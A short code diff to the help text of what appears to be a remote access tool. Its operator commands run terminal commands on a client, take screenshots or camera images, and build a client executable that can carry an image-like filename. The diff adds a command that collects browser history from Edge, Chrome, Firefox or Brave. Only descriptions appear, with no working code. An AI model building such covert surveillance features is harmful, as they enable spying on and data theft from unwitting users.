@@ -8,7 +8,8 @@ commands = {
     "help": "Show info about command. Accept --command",
     "cmd": "execute arg in terminal. You must pass the command in --command flag",
     "close":"end connections or specific connections. Accept --host",
-    "generate app": "Generate exe for client. Accept --name"
+    "generate app": "Generate exe for client. Accept --name",
+    "get historial": "It allow get browser historial. Accept --browser. get from edge by default"
 }
 
 
@@ -17,7 +18,8 @@ flags = {
     "--name": "namefile. You have write type file: hola.png",
     "--time": "time in seconds",
     "--command": "name command like screenshot, camera..... If you are using it with 'cmd' command can be: ipconfig, ...",
-    "--flag": "flag name"
+    "--flag": "flag name",
+    "--browser": "browser name. Could be (chrome, edge, firefox, brave)"
 }
 
 
